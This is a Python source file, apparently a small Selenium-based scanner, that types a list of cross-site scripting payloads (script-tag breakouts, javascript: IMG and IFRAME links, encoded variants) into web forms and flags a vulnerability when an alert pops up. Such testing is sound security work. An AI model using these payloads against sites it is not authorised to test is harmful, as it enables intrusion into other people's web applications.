import selenium
from selenium.common.exceptions import UnexpectedAlertPresentException

class MonsterTest(object):
    data = {}

    def __init__(self, client, url):
        self.client = client
        self.base_url = url

    def get_strings(self):
        return self.data.values()

    def get_string_name(self, string):
        for name, fuzz_string in self.get_strings():
            if string == fuzz_string:
                return name
        return False

    def attack():
        pass


class XSSTest(MonsterTest):

    data = {
        'double_bracket': '<<script>alert(1);//<</script>',
        'tag_close': '\'"><script>alert(1);</script>',
        'img_js_link': '<IMG SRC=javascript:alert(1)>',
        'img_js_link_w_0x0D': '<IMG SRC=jav&#x0D;ascript:alert(1);>',
        'img_js_link_overencode':
            "<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:alert(1);'>",
        'iframe_js_link': '<IFRAME SRC=javascript:alert(1)></IFRAME>',
        'js_context': '\\\'";alert(1);//'
    }

    def verify_response(self):
        print 'ha'

    def attack_all(self, form):
        for name, string in self.data.iteritems():
            self.single_attack(form, string)

    def single_attack(self, form, string):
        form_children = self.client.get_elem_children(form)
        for elem in form_children:
            elem.send_keys(string)
        try:
            form.submit()
            if self.client.driver.current_url != self.base_url:
                self.client.get(self.base_url)
        except UnexpectedAlertPresentException:
            print "XSS VULNERABILITY FOUND!"

    def attack(self, form):
        self.attack_all(form)
